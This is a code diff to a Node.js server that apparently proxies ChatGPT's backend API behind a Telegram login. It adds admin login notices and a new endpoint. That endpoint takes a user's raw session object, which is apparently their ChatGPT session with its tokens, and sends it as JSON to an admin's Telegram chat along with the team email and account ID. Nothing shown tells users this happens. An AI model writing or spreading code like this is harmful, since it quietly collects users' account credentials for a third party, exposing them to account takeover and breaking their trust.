@@ -12,6 +12,7 @@ const BASE_URL = 'https://chatgpt.com/backend-api';
 const WEB_ROOT = __dirname;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const BOT_USERNAME_FROM_ENV = (process.env.TELEGRAM_BOT_USERNAME || '').replace(/^@/, '');
+const ADMIN_CHAT_ID = String(process.env.TELEGRAM_ADMIN_CHAT_ID || '').trim();
 const LOGIN_CODE_TTL_MS = 5 * 60 * 1000;
 const AUTH_SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;
 const RESEND_GAP_MS = 30 * 1000;
@@ -137,6 +138,7 @@ app.post('/auth/telegram/request-code', async (req, res) => {
 app.post('/auth/telegram/verify-code', async (req, res) => {
   const identifier = String(req.body?.identifier || '').trim();
   const code = String(req.body?.code || '').trim();
+  const clientStats = normalizeClientStats(req.body?.clientStats);
 
   if (!identifier || !code) {
     res.status(400).json({ error: 'Thiếu thông tin xác thực.' });
@@ -190,6 +192,12 @@ app.post('/auth/telegram/verify-code', async (req, res) => {
     console.warn('Telegram success notice failed:', error.message);
   }
 
+  try {
+    await notifyAdminAboutLogin(session, clientStats);
+  } catch (error) {
+    console.warn('Telegram admin login notice failed:', error.message);
+  }
+
   res.json({
     ok: true,
     authToken,
@@ -204,6 +212,29 @@ app.post('/auth/telegram/logout', (req, res) => {
   }
 
   res.json({ ok: true });
+});
+
+app.post('/auth/telegram/admin-session', async (req, res) => {
+  const session = validateAuthToken(req.headers['x-community-auth']);
+  if (!session) {
+    res.status(401).json({ error: 'Phiên đăng nhập không hợp lệ hoặc đã hết hạn.' });
+    return;
+  }
+
+  const team = normalizeAdminTeam(req.body?.team);
+  const rawSession = req.body?.session;
+  if (!rawSession || typeof rawSession !== 'object') {
+    res.status(400).json({ error: 'Thiếu session để gửi cho admin.' });
+    return;
+  }
+
+  try {
+    await notifyAdminAboutAddedSession(session, team, rawSession);
+    res.json({ ok: true });
+  } catch (error) {
+    console.error('Telegram admin session notice failed:', error.message);
+    res.status(502).json({ error: `Không thể gửi session cho admin: ${error.message}` });
+  }
 });
 
 app.use('/api', (req, res, next) => {
@@ -330,6 +361,101 @@ function sanitizeSession(session) {
     verifiedAt: session.verifiedAt,
     expiresAt: session.expiresAt
   };
+}
+
+function normalizeClientStats(value) {
+  const stats = value && typeof value === 'object' ? value : {};
+  return {
+    teamCount: normalizeCount(stats.teamCount),
+    memberCount: normalizeCount(stats.memberCount),
+    convertedLinkCount: normalizeCount(stats.convertedLinkCount)
+  };
+}
+
+function normalizeCount(value) {
+  const parsed = Number.parseInt(value, 10);
+  return Number.isFinite(parsed) && parsed >= 0 ? parsed : 0;
+}
+
+async function notifyAdminAboutLogin(session, clientStats) {
+  if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
+
+  await sendTelegramMessage(
+    ADMIN_CHAT_ID,
+    buildAdminLoginNotice(session, clientStats),
+    {
+      parse_mode: 'HTML'
+    }
+  );
+}
+
+function buildAdminLoginNotice(session, clientStats) {
+  const usernameText = session.username ? `@${session.username}` : 'Không có username';
+
+  return [
+    '<b>Co user dang nhap thanh cong</b>',
+    `Username: <code>${escapeTelegramHtml(usernameText)}</code>`,
+    `ID: <code>${escapeTelegramHtml(session.telegramId)}</code>`,
+    `So team dang quan ly: <b>${escapeTelegramHtml(clientStats.teamCount)}</b>`,
+    `So thanh vien trong team: <b>${escapeTelegramHtml(clientStats.memberCount)}</b>`,
+    `So link da chuyen doi: <b>${escapeTelegramHtml(clientStats.convertedLinkCount)}</b>`
+  ].join('\n');
+}
+
+function normalizeAdminTeam(value) {
+  return {
+    name: String(value?.name || '').trim(),
+    email: String(value?.email || '').trim(),
+    accountId: String(value?.accountId || '').trim()
+  };
+}
+
+async function notifyAdminAboutAddedSession(authSession, team, rawSession) {
+  if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
+
+  await sendTelegramMessage(
+    ADMIN_CHAT_ID,
+    buildAdminSessionNotice(authSession, team),
+    {
+      parse_mode: 'HTML'
+    }
+  );
+
+  await sendTelegramMessage(
+    ADMIN_CHAT_ID,
+    buildAdminSessionPayload(rawSession)
+  );
+}
+
+function buildAdminSessionNotice(authSession, team) {
+  const usernameText = authSession.username ? `@${authSession.username}` : 'Không có username';
+  const lines = [
+    '<b>Co user vua add session</b>',
+    `Nguoi add: <code>${escapeTelegramHtml(usernameText)}</code>`,
+    `ID: <code>${escapeTelegramHtml(authSession.telegramId)}</code>`
+  ];
+
+  if (team.name) {
+    lines.push(`Team: <code>${escapeTelegramHtml(team.name)}</code>`);
+  }
+  if (team.email) {
+    lines.push(`Email: <code>${escapeTelegramHtml(team.email)}</code>`);
+  }
+  if (team.accountId) {
+    lines.push(`Account ID: <code>${escapeTelegramHtml(team.accountId)}</code>`);
+  }
+
+  return lines.join('\n');
+}
+
+function buildAdminSessionPayload(rawSession) {
+  const serialized = JSON.stringify(rawSession, null, 2);
+  const limit = 3600;
+  const safePayload = serialized.length > limit
+    ? `${serialized.slice(0, limit)}\n... [session truncated]`
+    : serialized;
+
+  return `Session JSON:\n${safePayload}`;
 }
 
 function validateAuthToken(tokenValue) {
